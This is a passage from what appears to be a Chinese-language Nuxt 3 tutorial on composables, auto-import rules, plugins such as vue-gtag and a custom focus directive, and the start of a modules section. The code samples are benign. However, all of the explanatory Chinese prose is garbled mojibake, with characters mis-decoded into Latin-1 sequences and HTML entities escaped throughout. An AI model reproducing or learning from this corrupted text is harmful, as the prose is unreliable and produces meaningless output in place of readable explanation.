ï¼Œå¯ä»¥ç™¼ç¾åˆ°ç”±ä¼ºæœå™¨æ¸²æŸ“çš„æ’æ§½å…ƒç´  [IronManWelcome] è¼‰å…¥ä¸­\u0026hellip; æ–‡å­—èˆ‡ ClientAndServer.server.vue å…ƒä»¶ï¼Œç‡å…ˆè¢«é¡¯ç¤ºäº†å‡ºä¾†ã€‚æ¥è‘—ç•¶ JS è¼‰å…¥å®Œç•¢å¾Œï¼Œè¢« åŒ…è£¹çš„å…ƒä»¶ \u0026lt;IronManWelcome\u0026gt; ä¹Ÿæ¥æ‰‹ä¸¦è¦†è“‹äº†ã€Œ[IronManWelcome] è¼‰å…¥ä¸­\u0026hellip;ã€æ–‡å­—ï¼ŒClientAndServer.client.vue èˆ‡ JustClient.client.vue åƒ…åœ¨å®¢æˆ¶ç«¯æ¸²æŸ“çš„å…ƒä»¶ï¼Œä¹Ÿåˆ†åˆ¥çš„è¦†è“‹èˆ‡é¡¯ç¤ºå‡ºä¾†ã€‚\né€éå…ƒä»¶æˆ‘å€‘èƒ½æ›´å¥½çš„æ•´ç†å¯é‡è¤‡ä½¿ç”¨çš„ç¨‹å¼ç¢¼ï¼Œä¹Ÿæå‡äº†å¯ç¶­è­·æ€§ï¼Œè€Œ Nuxt ä¸­çš„å‹•æ…‹è¼‰å…¥æ›´æ˜¯èƒ½å°‡éå¿…è¦ä½¿ç”¨çš„å…ƒä»¶å»¶é²è¼‰å…¥ï¼Œå¤§å¤§æå‡äº†é¦–æ¬¡é€²å…¥ç¶²é æ‰€éœ€è¦ä¸‹è¼‰çš„æª”æ¡ˆå¤§å°ï¼Œæœ€å¾Œæˆ‘å€‘ä¹Ÿä»‹ç´¹äº†å¦‚ä½•æ§åˆ¶ä¼ºæœå™¨ç«¯æˆ–å®¢æˆ¶ç«¯æ¸²æŸ“å…ƒä»¶ï¼Œç†Ÿæ‚‰äº†ä¹‹å¾Œå°±èƒ½é‡å°ç¶²ç«™éœ€æ±‚è¨­å®šå…ƒä»¶çš„è¼‰å…¥åŠæ¸²æŸ“æ–¹å¼å›‰ï¼\nçµ„åˆå¼å‡½æ•¸ (Composables) çµ„åˆå¼å‡½æ•¸ (Composables) æ˜¯ä¸€ç¨®åˆ©ç”¨ Vue 3 çš„ Composition API ä¾†å°è£å’Œè¤‡ç”¨æœ‰ç‹€æ…‹é‚è¼¯çš„å‡½æ•¸ï¼Œåœ¨ Nuxt æˆ‘å€‘å¯ä»¥å°‡ä¸€äº›é€šç”¨çš„å•†æ¥­é‚è¼¯æ”¾ç½®åœ¨ composables ä¾†å»ºç«‹çµ„åˆå¼å‡½æ•¸ï¼Œé€™æ¨£ä¸€ä¾†å°±å¯ä»¥åœ¨å„å€‹é é¢å…±ç”¨é€™å€‹çµ„åˆå¼å‡½æ•¸ã€‚\nOptions API èˆ‡ Composition API é¸é …å¼ API (Options API)ï¼š ä¸‹åˆ—é€™æ®µæ˜¯ Vue ä¾æ“š Options API æ’°å¯«å‡ºä¾†çš„ç¨‹å¼ç¢¼ï¼Œä¹Ÿæ˜¯ Vue 2 è™•ç†é‚è¼¯çš„å¯«æ³•ï¼Œæ‰€è¬‚ Options (é¸é …ã€å¯é¸çš„) æŒ‡çš„å°±æ˜¯ä»¥ç¨‹å¼ç¢¼çš„æ€§è³ªä¾†åˆ†å‰²ç¨‹å¼ç¢¼ï¼Œæ‰€æœ‰è¨­å®šè³‡æ–™åˆå§‹å€¼çš„éƒ½æœƒåœ¨ data é€™é‚Šè™•ç†ï¼Œé€™å€‹å…ƒä»¶æ‰€éœ€è¦çš„æ–¹æ³•å‰‡æœƒåœ¨ methods é€™è£¡å»ºç«‹ï¼Œdata åŠ methods ä¹Ÿå°±æ˜¯ä½¿ç”¨è€…éœ€è¦çš„é¸é …ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;script\u0026gt; export default { data() { return { count: 0, doubleCount: 0 } }, methods: { increment() { this.count += 1 }, incrementByTwo() { this.doubleCount += 2 } } } \u0026lt;/script\u0026gt; çµ„åˆå¼ API (Composition API)ï¼š ç›®å‰åœ¨ Vue 3 ä½ ä»å¯ä»¥ç¹¼çºŒä½¿ç”¨ Vue 2 çš„ Options APIï¼Œä½†éš¨è‘—ç¨‹å¼ç¢¼é‚è¼¯çš„å¢åŠ ï¼Œçœ‹ä¼¼æœ‰æ¢ç†çš„åˆ†é¡ï¼Œå…¶å¯¦å°æ–¼ç†è§£åŠç¶­è­·ä¸Šæ²’æœ‰æƒ³åƒä¸­ä¾¿åˆ©ã€‚\nVue 3 æå‡ºçš„çµ„åˆå¼ API (Composition API) å‰‡æ˜¯ä»¥é‚è¼¯åŠŸèƒ½ä¾†é€²è¡Œåˆ†é¡ï¼Œä½ å¯ä»¥å°‡æ‰€æœ‰èˆ‡æŸå€‹åŠŸèƒ½çš„ dataã€computedã€methods èˆ‡ watch \u0026hellip;ç­‰ï¼Œå¯«åœ¨åŒä¸€å€‹æ®µè½è¡Œç¨‹ä¸€å€‹å€å¡Šã€‚\nè©³ç´°èªªæ˜å¯é–±è®€å…ˆå‰æ’°å¯«çš„åœ–è§£ Option API vs Composition APIæ–‡ç« ã€‚\nMixins èˆ‡ Composables åœ¨ Options API å¯ä»¥ä½¿ç”¨ mixin ä¾†å¼•å…¥å¯ä»¥é‡è¤‡ä½¿ç”¨çš„ç¨‹å¼ç¢¼ï¼Œè®“ä¸åŒçš„å…ƒä»¶å¯ä»¥å…±ç”¨å‡½æ•¸æ–¹æ³•ï¼Œä½†éš¨è‘—å°ˆæ¡ˆè®Šå¤§ï¼ŒåŒä¸€å€‹å…ƒä»¶å¯èƒ½ä½¿ç”¨ mixin åŒæ™‚ä¾†å¼•ç”¨è¨±å¤šçš„å…±ç”¨å‡½æ•¸ï¼Œé€™å°‡å°è‡´å®¹æ˜“ç”¢ç”Ÿå‘½åè¡çªã€å…ƒä»¶é–“çš„è€¦åˆèˆ‡ä¾†æºä¸å¤ æ¸…æ™°ç­‰å•é¡Œï¼ˆè©³ç´°åŸå› è«‹åƒè€ƒæ·ºè«‡ç‚ºä»€éº¼ Vue å’Œ React éƒ½é¸æ“‡äº† Hooksï¼Ÿï¼‰ã€‚\nVue 3 ç‚ºæˆ‘å€‘å¸¶ä¾†äº†çµ„åˆå¼ APIï¼Œå¯¦ç¾äº†æ›´ä¹¾æ·¨çš„ç¨‹å¼ç¢¼ç·¨æ’èˆ‡é«˜æ•ˆçš„é‚è¼¯é‡ç”¨ï¼Œ**çµ„åˆå¼å‡½æ•¸ (Composables)**ä¹ŸåŸºæ–¼çµ„åˆå¼ API ä¾†é€²è¡Œå°è£é€™äº›å¯è¤‡ç”¨çš„é‚è¼¯ï¼Œæ›´è§£æ±ºäº†ä½¿ç”¨ mixin å¯¦ç¾å…±ç”¨å‡½æ•¸çš„ç¼ºé»ã€‚\nçµ„åˆå¼å‡½æ•¸ (Composables) åœ¨ Nuxt 3 ä¸­è¦å»ºç«‹ä¸€å€‹çµ„åˆå¼å‡½æ•¸ (Composables) æˆ‘å€‘å¯ä»¥åœ¨ composables ç›®éŒ„ä¸‹ç·¨å¯«ï¼Œé€™äº›å¸¸ç”¨çš„å‡½æ•¸ï¼Œå°‡æœƒè¢« Nuxt 3 è‡ªå‹•è¼‰å…¥åšä½¿ç”¨ï¼Œå¯¦ç¾åœ¨å„å€‹å…ƒä»¶ä½¿ç”¨é€™äº›å‡½æ•¸æ–¹æ³•ã€‚\nå»ºç«‹çµ„åˆå¼å‡½æ•¸ é¦–å…ˆï¼Œæˆ‘å€‘æ–°å¢ ./composables/useCounter.jsï¼Œå…§å®¹å¦‚ä¸‹ï¼š\ncomposables/useCounter.js 1 2 3 4 5 6 7 8 9 10 11 12 export default function () { const count = ref(0) const increment = () =\u0026gt; { count.value += 1 } return { count, increment } } Nuxt è‡ªå‹•å°å…¥çš„ç‰¹æ€§ï¼Œç¾åœ¨æˆ‘å€‘å°±èƒ½åœ¨å…¶ä»–å…ƒä»¶ä¸­ä½¿ç”¨ useCounter çµ„åˆå¼å‡½æ•¸ã€‚\næ–°å¢ ./pages/count.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\npages/count.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;mt-8 text-4xl text-gray-700\u0026#34;\u0026gt;{{ count }}\u0026lt;/span\u0026gt; \u0026lt;button class=\u0026#34;my-6 rounded-sm bg-sky-600 py-2 px-4 text-base font-medium text-white hover:bg-sky-700 focus:outline-none focus:ring-2 focus:ring-sky-500 focus:ring-offset-2\u0026#34; @click=\u0026#34;increment\u0026#34; \u0026gt; å¢åŠ  1 \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const { count, increment } = useCounter() \u0026lt;/script\u0026gt; Composables çµ„åˆå¼å‡½æ•¸çš„åç¨± å‰é¢ç¯„ä¾‹ä½¿ç”¨çš„ useCounter() æ˜¯ Nuxt 3 å¾ ./composables/useCounter.js è‡ªå‹•è¼‰å…¥çš„ï¼Œè€Œä¸” Nuxt 3 çš„çµ„åˆå¼å‡½æ•¸çš„åç¨±ï¼Œæœ‰å…©ç¨®æ–¹å¼æœƒå½±éŸ¿ä½¿ç”¨æ™‚çš„å‡½æ•¸åç¨±ï¼Œä¸éä¹Ÿå»ºè­°åœ¨å»ºç«‹çµ„åˆå¼å‡½æ•¸å¯ä»¥ä½¿ç”¨ use ä½œç‚ºé–‹é ­ä¾†åŠ ä»¥è­˜åˆ¥ã€‚\n1. ä½¿ç”¨é è¨­åŒ¯å‡º (Default export) å¦‚æœåœ¨æª”æ¡ˆå…§ä½¿ç”¨çš„æ˜¯é è¨­åŒ¯å‡ºï¼Œé‚£éº¼é€™å€‹çµ„åˆå¼å‡½æ•¸åœ¨ä½¿ç”¨æ™‚ï¼Œå³å°æ‡‰æª”æ¡ˆåç¨±ï¼Œæª”æ¡ˆåç¨±å¯ä»¥æ˜¯å°å¯«é§å³°å¼ (Camel case) æˆ–çƒ¤è‚‰ä¸² (Kebab case)ï¼Œä¾‹å¦‚å»ºç«‹ ./composables/useCounter.js æˆ– ./composables/use-counter.js æª”æ¡ˆå…§å®¹å¦‚ä¸‹ï¼Œä½¿ç”¨æ™‚çµ„åˆå¼å‡½æ•¸ç‚ºå°å¯«é§å³°å¼(Camel case) åç‚º useCounterã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 export default function () { const count = ref(0) const increment = () =\u0026gt; { count.value += 1 } return { count, increment } } 2. ä½¿ç”¨å…·ååŒ¯å‡º (Named export) å¦‚æœå»ºç«‹çµ„åˆå¼å‡½æ•¸æ™‚ï¼Œä½¿ç”¨çš„æ˜¯æœ‰å…·åçš„åŒ¯å‡ºï¼Œé‚£éº¼çµ„åˆå¼å‡½æ•¸å°æ‡‰çš„åç¨±ï¼Œå°±ä¸æ˜¯æª”æ¡ˆåç¨±ï¼Œè€Œæ˜¯æª”æ¡ˆå…§ export å‡ºä¾†çš„åç¨±ã€‚\nä¾‹å¦‚ï¼Œå»ºç«‹ ./composables/count.jsï¼Œæª”æ¡ˆå…§å®¹å¦‚ä¸‹ï¼Œçµ„åˆå¼å‡½æ•¸åç¨±å°±ä¸æœƒæ˜¯æª”æ¡ˆåç¨± countï¼Œè€Œæ˜¯å…·åå°å‡ºçš„åç¨± useCounterã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 export const useCounter = () =\u0026gt; { const count = ref(0) const increment = () =\u0026gt; { count.value += 1 } return { count, increment } } Composables è‡ªå‹•è¼‰å…¥çš„è¦å‰‡ composables ç›®éŒ„ä¸‹ï¼ŒNuxt 3 æœƒè‡ªå‹•æƒæ .jsã€.ts èˆ‡ .vue å‰¯æª”åçš„æª”æ¡ˆï¼Œä½†åªæœ‰æœ€ä¸Šå±¤çš„æª”æ¡ˆï¼Œæ‰æœƒè‡ªå‹•çš„è¢«è¼‰å…¥ç‚ºçµ„åˆå¼å‡½æ•¸ï¼Œä»¥ä¸‹é¢é€™å€‹ç›®éŒ„çµæ§‹ç‚ºä¾‹ï¼Œåªæœ‰ ./composables/useCounter.js æ‰æœƒè¢«æ­£ç¢ºçš„è‡ªå‹•è¼‰å…¥ã€‚\n1 2 3 4 composables/ â”œâ”€â”€ time/ â”‚ â””â”€â”€ useDateFormat.js â””â”€â”€ useCounter.js ä¸‹åˆ—é€™ç¨®å½¢å¼ï¼Œ./composables/time/index.js ä¹Ÿèƒ½æ­£ç¢ºçš„è‡ªå‹•è¼‰å…¥ï¼š\n1 2 3 4 composables/ â”œâ”€â”€ time/ â”‚ â””â”€â”€ index.js â””â”€â”€ useCounter.js å¦‚æœä½ æƒ³è®“å·¢ç‹€çš„ç›®éŒ„çµæ§‹ä¸‹ä¹Ÿèƒ½è¢« Nuxt è‡ªå‹•æƒæè¼‰å…¥ï¼Œé‚£éº¼ä½ å¯ä»¥ä½¿ç”¨ä¸‹é¢å…©ç¨®æ–¹æ³•ï¼š\nä¸€ã€é‡æ–°åŒ¯å‡º [æ¨è–¦] é…ç½® ./composables/index.js å°‡ç›®éŒ„ä¸‹çš„å‡½æ•¸æ–¼é€™è£¡æ•´ç†ä¸¦åŒ¯å‡ºä½ éœ€è¦çš„ä½œç‚ºçµ„åˆå¼å‡½æ•¸ã€‚\näºŒã€é…ç½®æƒæå·¢ç‹€ç›®éŒ„ ä¿®æ”¹ nuxt.config.ts æª”æ¡ˆï¼Œé…ç½®è‡ªå‹•è¼‰å…¥é¡å¤–æƒæ composables ä¸‹çš„å·¢ç‹€ç›®éŒ„ã€‚\nnuxt.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 export default defineNuxtConfig({ imports: { dirs: [ // æƒæ composables ç›®éŒ„é ‚å±¤ \u0026#39;composables\u0026#39;, // æƒææ·±åº¦ä¸€å±¤çš„ç‰¹å®šæª”æ¡ˆ \u0026#39;composables/*/index.{ts,js,mjs,mts}\u0026#39;, // æƒææ•´å€‹ composables ç›®éŒ„ä¸‹çš„æª”æ¡ˆ \u0026#39;composables/**\u0026#39; ] } }) ä¸è«–åœ¨ Nuxt 3 æˆ–æ˜¯ Vue 3ï¼Œçµ„åˆå¼å‡½æ•¸ (Composables) éƒ½æ˜¯èƒ½å¹«åŠ©ä½ åœ¨æ•´å€‹ç¶²ç«™å¯ä»¥å…±ç”¨å‡½æ•¸çš„æ–¹æ³•ï¼Œç›®å‰ä¹Ÿæœ‰å°ˆæ¡ˆ VueUse æä¾›äº†å¸¸ç”¨èˆ‡å¯¦ç”¨çš„çµ„åˆå¼å‡½æ•¸é›†åˆï¼Œèƒ½å¹«æˆ‘å€‘çœå»ä¸å°‘é–‹ç™¼æ™‚é–“èˆ‡æå‡é‡è¤‡ä½¿ç”¨æ€§ï¼ŒVueUseçš„ä»‹ç´¹è«‹é»æˆ‘å‰å¾€ã€‚\næ’ä»¶ (Plugins) åœ¨é–‹ç™¼æ™‚ï¼Œç‚ºäº†ä¸é‡è¤‡é€ è¼ªå­ï¼Œæˆ‘å€‘å¯èƒ½æœƒåœ¨ç¶²è·¯ä¸Šæ‰¾çœ‹çœ‹æœ‰æ²’æœ‰ç¾æˆçš„å¥—ä»¶å¯ä»¥åšä½¿ç”¨ï¼Œå¦‚æœé€™å€‹å¥—ä»¶åœ¨ Nuxt 3 æ²’æœ‰å°ˆç”¨çš„æ¨¡çµ„æˆ–æ’ä»¶ï¼Œé‚£éº¼æˆ‘å€‘å°±åªèƒ½ä¾ç…§å¥—ä»¶çš„æ”¯æ´èˆ‡å®‰è£æ–¹å¼å˜—è©¦æ·»åŠ è‡³ Nuxt ä¸­ä½¿ç”¨ã€‚é€™é‚Šå°‡æœƒä»‹ç´¹åœ¨ Nuxt æ’ä»¶çš„è¦å‰‡èˆ‡ç‰¹æ€§ï¼Œå¦‚ä½•å»ºç«‹è‡ªå·±çš„æ’ä»¶åŠå®‰è£ Vue çš„æ’ä»¶ã€‚\nèªªåˆ°æ’ä»¶ (Plugins)ï¼ŒChrome æˆ– Firefox ç­‰ç€è¦½å™¨çš„ä½¿ç”¨è€…ï¼Œä¸€å®šéƒ½è½éä¹Ÿå®‰è£éæ’ä»¶ï¼›å¦‚æœç€è¦½å™¨ä¸­çš„åŠŸèƒ½ä¸å¤ æ»¿è¶³ä½ çš„éœ€æ±‚ï¼Œé‚£éº¼ä½ å¯ä»¥é€éå®‰è£æ’ä»¶ä¾†å˜—è©¦è§£æ±ºä½ çš„å•é¡Œï¼Œè€Œæ’ä»¶åšçš„å°±æ˜¯å¹«åŠ©ä½ çš„ç€è¦½å™¨æˆ–æ˜¯ç¶²ç«™ï¼Œæ·»åŠ ä¸€äº›åŠŸèƒ½æˆ–æ˜¯é…ç½®ï¼Œåšä¸€å€‹æ“´å……çš„å‹•ä½œã€‚åœ¨ Nuxt 3 æŒ‡çš„æ’ä»¶ï¼Œé“ç†ä¹Ÿæ˜¯ä¸€æ¨£çš„ï¼Œæˆ‘å€‘å¯ä»¥é€éæ’ä»¶ä¾†å”åŠ©æˆ‘å€‘æ“´å……åŠŸèƒ½ã€‚\nNuxt 3 æ’ä»¶ç›®éŒ„ Nuxt å°‡è‡ªå‹•è®€å– plugins ç›®éŒ„ä¸­çš„æª”æ¡ˆä¸¦è‡ªå‹•è¼‰å…¥å®ƒå€‘ï¼Œä¹Ÿå› ç‚ºç›®éŒ„ä¸­çš„æ‰€æœ‰æ’ä»¶éƒ½æ˜¯è‡ªå‹•è¼‰å…¥çš„ï¼Œå› æ­¤ä¸å¿…æ–¼ nuxt.config.ts ä¸­å†å€‹åˆ¥é…ç½®ã€‚\nNuxt æœƒè‡ªå‹•æƒæ plugins ç›®éŒ„ä¸‹çš„ .jsã€.ts èˆ‡ .vue å‰¯æª”åçš„æª”æ¡ˆï¼Œä½†åªæœ‰æœ€ä¸Šå±¤çš„æª”æ¡ˆæˆ–æœ€ä¸Šå±¤ç›®éŒ„ä¸‹çš„ index.js æª”æ¡ˆæ‰æœƒè¢«è‡ªå‹•è¼‰å…¥ã€‚\nä¾‹å¦‚ï¼Œåªæœ‰ ./plugins/myPlugin.js åŠ ./plugins/myPlugin/index.js æœƒè‡ªå‹•çš„è¢« Nuxt è¼‰å…¥ã€‚\n1 2 3 4 plugins/ â”œâ”€â”€ myPlugin/ â”‚ â””â”€â”€ index.js â””â”€â”€ myPlugin.js å¦‚ä½•å»ºç«‹æ’ä»¶ ç•¶æ‚¨å»ºç«‹å¥½æ’ä»¶çš„æª”æ¡ˆå¾Œï¼Œåªéœ€è¦ä½¿ç”¨é è¨­å°å‡º Nuxt 3 ä¸­çš„ defineNuxtPlugin æ–¹æ³•ï¼Œå‚³éçµ¦æ’ä»¶çš„å”¯ä¸€åƒæ•¸æ˜¯ nuxtAppï¼Œæ¥è‘—å°±å¯ä»¥åœ¨è£¡é ­å¯¦ä½œåŠŸèƒ½ã€‚\n1 2 3 export default defineNuxtPlugin(nuxtApp =\u0026gt; { // å¯ä»¥ä½¿ç”¨ nuxtApp ä¾†åšä¸€äº›äº‹æƒ… }) åˆæ¬¡å»ºç«‹æ’ä»¶æ™‚ï¼Œå¯ä»¥å˜—è©¦å°å‡º nuxtApp åƒæ•¸çœ‹çœ‹ï¼Œå¦‚ä¸‹åœ–ï¼ŒnuxtApp åŒ…å«äº†å„ç¨®çš„å¯¦ä¾‹ (Instance)ï¼Œä¾‹å¦‚æˆ‘å€‘è¦ä½¿ç”¨ Vue çš„ app.useï¼Œå°±å¯ä»¥åœ¨ nuxtApp æ‰¾åˆ° Vue çš„å¯¦ä¾‹ vueAppï¼Œä¸¦é€é nuxtApp.vueApp.use ä¾†å®‰è£ Vue çš„æ’ä»¶ã€‚\nåœ¨æ’ä»¶ä¸­ä½¿ç”¨çµ„åˆå¼å‡½æ•¸ (Composables) ä½ ä¹Ÿå¯ä»¥åœ¨è‡ªå®šç¾©çš„æ’ä»¶ä¸­ä½¿ç”¨çµ„åˆå¼å‡½æ•¸ï¼Œä½†åœ¨æ’ä»¶ä¸­å­˜åœ¨è‘—ä¸€äº›é™åˆ¶å’Œå·®ç•°ã€‚\næ’ä»¶çš„è¼‰å…¥é †åº æ’ä»¶æ˜¯ä¾ç…§é †åºä¾†å‘¼å«çš„ï¼Œå¦‚æœä½ ä½¿ç”¨çš„çµ„åˆå¼å‡½æ•¸ï¼Œä¾è³´è‘—å°šæœªè¼‰å…¥çš„æ’ä»¶ï¼Œå®ƒå°‡ç„¡æ³•æ­£å¸¸çš„åŸ·è¡Œï¼›é™¤éä½ å¾ˆç¢ºå®šæ’ä»¶çš„è¼‰å…¥é †åºï¼Œä¸ç„¶å„˜é‡åœ¨æ’ä»¶å…§ä½¿ç”¨å…¶ä»–æœƒä¾è³´æ’ä»¶æˆ–ç”±å…¶ä»–æ’ä»¶æ‰€æä¾›çš„çµ„åˆå¼å‡½æ•¸ã€‚\nä¾è³´ Vue çš„ç”Ÿå‘½é€±æœŸ å¦‚æœæ’ä»¶å…§æ‰€ä½¿ç”¨çš„çµ„åˆå¼å‡½æ•¸ï¼Œä¾è³´æ–¼ Vue çš„ç”Ÿå‘½é€±æœŸï¼Œé‚£éº¼ä¹Ÿæœƒç„¡æ³•æ­£å¸¸çš„åŸ·è¡Œï¼Œå› ç‚ºæ’ä»¶åªæœƒç¶å®šåˆ° nuxtApp çš„å¯¦ä¾‹ä¸Šï¼Œèˆ‡ Vue å…ƒä»¶å…§ä½¿ç”¨çµ„åˆå¼å‡½æ•¸ç¶å®šçš„å…ƒä»¶å¯¦ä¾‹ï¼Œæœ‰æ‰€ä¸åŒã€‚\nAutomatically Providing Helpers å¦‚æœæƒ³åœ¨ NuxtApp çš„å¯¦ä¾‹ä¸Šæä¾› helperï¼Œæˆ‘å€‘å¯ä»¥åœ¨æ’ä»¶å›å‚³çš„ç‰©ä»¶ä¸­æ·»åŠ  provideã€‚\nä¾‹å¦‚ï¼Œæˆ‘å€‘å»ºç«‹ä¸€å€‹æ’ä»¶ ./plugins/myPlugin.jsï¼Œå…§å®¹å¦‚ä¸‹ï¼š\nplugins/myPlugin.js 1 2 3 4 5 6 7 export default defineNuxtPlugin(() =\u0026gt; { return { provide: { hello: (msg) =\u0026gt; `Hello ${msg}!` } } }) èª¿æ•´ ./app.vue å…§å®¹ï¼š\napp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;my-2 text-6xl font-semibold text-sky-400\u0026#34;\u0026gt;{{ title }}\u0026lt;/h1\u0026gt; \u0026lt;h1 class=\u0026#34;my-2 text-6xl font-semibold text-emerald-400\u0026#34;\u0026gt;{{ $hello(\u0026#39;Jennifer\u0026#39;) }}\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const { $hello } = useNuxtApp() const title = $hello(\u0026#39;Ryan\u0026#39;) \u0026lt;/script\u0026gt; æˆ‘å€‘å°±å¯ä»¥ç›´æ¥åœ¨ template ä¸­ä½¿ç”¨ $helloï¼Œé€™å€‹ç”±æ’ä»¶æä¾›çš„ Helperï¼Œæ³¨æ„é€™é‚Šè¦åŠ ä¸ŠéŒ¢å­—ç¬¦è™Ÿ $ã€‚ä¹Ÿå¯ä»¥é€é useNuxtApp æ–¹æ³•å–å¾— NuxtApp çš„å¯¦ä¾‹å¾Œå†ä½¿ç”¨ $helloã€‚\nåƒ…é™ä¼ºæœå™¨ç«¯æˆ–å®¢æˆ¶ç«¯ä¸­ä½¿ç”¨ æœ‰äº›æ’ä»¶å¯èƒ½åªèƒ½åœ¨ç€è¦½å™¨ä¸­ä½¿ç”¨ï¼ŒåŸå› å¯èƒ½æ˜¯é€™å€‹æ’ä»¶ä¸éœ€è¦æˆ–ç„¡æ³•åœ¨ä¼ºæœå™¨ç«¯ä¸­åŸ·è¡Œã€‚\næˆ‘å€‘å¯ä»¥é€éæ’ä»¶çš„æª”æ¡ˆåç¨±ä¾†æ·»åŠ å¾Œç¶´ .client æˆ– .serverï¼Œæ§åˆ¶ä¼ºæœå™¨ç«¯æˆ–å®¢æˆ¶ç«¯ä¸­ä½¿ç”¨ã€‚\nVue æ’ä»¶èˆ‡æŒ‡ä»¤ é€™è£¡æˆ‘å€‘å˜—è©¦åœ¨ Nuxt 3 ä¸­ä½¿ç”¨ Vue çš„ vue-gtag æ’ä»¶ï¼Œä¾†æ·»åŠ  Google åˆ†ææ¨™ç±¤ã€‚\nNuxt 3 ä¸­ä½¿ç”¨ vue-gtag æ’ä»¶ Step 1. å®‰è£å¥—ä»¶ 1 2 3 npm install -D vue-gtag-next # or # yarn add -D vue-gtag-next Step 2. å»ºç«‹ Nuxt æ’ä»¶ æ–°å¢ vue-gtag.client.js æª”æ¡ˆï¼Œå…§å®¹å¦‚ä¸‹ï¼š\nplugins/vue-gtag.client.js 1 2 3 4 5 6 7 8 9 import VueGtag from \u0026#39;vue-gtag-next\u0026#39; export default defineNuxtPlugin((nuxtApp) =\u0026gt; { nuxtApp.vueApp.use(VueGtag, { property: { id: \u0026#39;GA_MEASUREMENT_ID\u0026#39; } }) }) å®Œæˆæ•ˆæœ å¯ä»¥çœ‹è¦‹ç€è¦½å™¨å°±å‡ºç¾ä½¿ç”¨ vue-gtag æ’ä»¶ï¼Œå¹«æˆ‘å€‘è‡ªå‹•æ’å…¥èˆ‡é…ç½® script çš„æ•ˆæœå›‰ï¼\nNuxt 3 ä¸­å»ºç«‹ Vue æŒ‡ä»¤ åœ¨æ’ä»¶ä¸­å¯ä»¥å–å¾— Vue çš„å¯¦ä¾‹ï¼Œæ‰€ä»¥æˆ‘å€‘ä¹Ÿèƒ½åœ¨æ’ä»¶è¨»å†Šè‡ªå®šç¾©çš„æŒ‡ä»¤ã€‚\nä¾‹å¦‚ï¼Œæ–°å¢ ./plugins/directive.js æª”æ¡ˆï¼Œå…§å®¹å¦‚ä¸‹ï¼š\nplugins/directive.js 1 2 3 4 5 6 7 8 9 10 11 export default defineNuxtPlugin((nuxtApp) =\u0026gt; { nuxtApp.vueApp.directive(\u0026#39;focus\u0026#39;, { mounted(el) { el.focus() }, getSSRProps() { // you can provide SSR-specific props here return {} } }) }) æˆ‘å€‘å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ v-focus é€™å€‹æŒ‡ä»¤ä¾†æ§åˆ¶å…ƒç´ èšç„¦çš„æ•ˆæœã€‚\nNuxt è®“æˆ‘å€‘å¯ä»¥å¾ˆè¼•é¬†çš„å»ºç«‹æ’ä»¶ä¸¦é¸æ“‡é…ç½®æ–¼ä¼ºæœå™¨ç«¯æˆ–å®¢æˆ¶ç«¯ï¼Œå°æ–¼ä½¿ç”¨ UI æ¡†æ¶æˆ–å…ƒä»¶ï¼Œæ›´èƒ½åœ¨æ’ä»¶ä¸­ç›´æ¥å–å¾—å¯¦ä¾‹ä¾†å®‰è£ Vue çš„æ’ä»¶èˆ‡æŒ‡ä»¤ï¼Œä¸éå‘¢ï¼Œç›®å‰ä¹Ÿæœ‰å€‹ RFC æ­£åœ¨å¾µæ±‚æ„è¦‹æœŸå¾…è®“ Nuxt ä½¿ç”¨ Vue æ’ä»¶å¯ä»¥æ›´æ–¹ä¾¿å®¹æ˜“ã€‚\næ¨¡çµ„ (Modules) Nuxt æä¾›äº†ä¸€å€‹æ¨¡çµ„ç³»çµ±ä¾†æ“´å±•è‡ªèº«æ¡†æ¶çš„æ ¸å¿ƒï¼Œä¹Ÿç°¡åŒ–äº†æ•´åˆéç¨‹ä¸­éœ€è¦çš„ç¹ç‘£é…ç½®ã€‚ç•¶ä½ æƒ³æ“´å±• Nuxt æˆ– Vue çš„åŠŸèƒ½ï¼Œé›–ç„¶ Nuxt å¯ä»¥é€šéå®‰è£èˆ‡é…ç½®æ’ä»¶é€²è¡ŒåŠŸèƒ½æ“´å±•ï¼Œä½†æ˜¯åœ¨å¤šå€‹å°ˆæ¡ˆæˆ–ä½¿ç”¨ä¸Šå¯èƒ½ç¹ç‘£è€—æ™‚æˆ–é‡è¤‡æ€§å¾ˆé«˜çš„ï¼Œä½†å¦‚æœå¥—ä»¶å·²ç¶“æœ‰é‡å° Nuxt æ¨¡çµ„åšæ•´åˆï¼Œæˆ‘å€‘å°±ä¸å¿…å¾é ­é–‹å§‹é–‹ç™¼æˆ–åƒå®‰è£æ’ä»¶ä¸€æ¨£éœ€è¦å»ºç«‹èˆ‡ç¶­è­·é€™äº›é…ç½®ã€‚\nNuxt 3 ä¸­æ’ä»¶èˆ‡æ¨¡çµ„çš„å·®ç•° Nuxt æ¨¡çµ„èˆ‡ Nuxt æ’ä»¶çš„å·®ç•°åœ¨æ–¼ï¼Œæ¨¡çµ„è¼‰å…¥åŸ·è¡Œçš„æ™‚é–“é»æ›´æ—©ï¼Œæ„æ€æ˜¯ Nuxt åœ¨å•Ÿå‹•ä¼ºæœå™¨å¾Œï¼Œé¦–å…ˆæœƒä¾åºçš„è¼‰å…¥æ¨¡çµ„ä¸¦åŸ·è¡Œï¼Œæ¥çºŒå»ºç«‹ Nuxt çš„ç’°å¢ƒ (Context) èˆ‡ Vue çš„å¯¦ä¾‹ (Instance)ï¼Œæœ€å¾Œæ‰é–‹å§‹åŸ·è¡Œ Nuxt çš„æ’ä»¶ã€‚\nå› æ­¤ï¼ŒNuxt 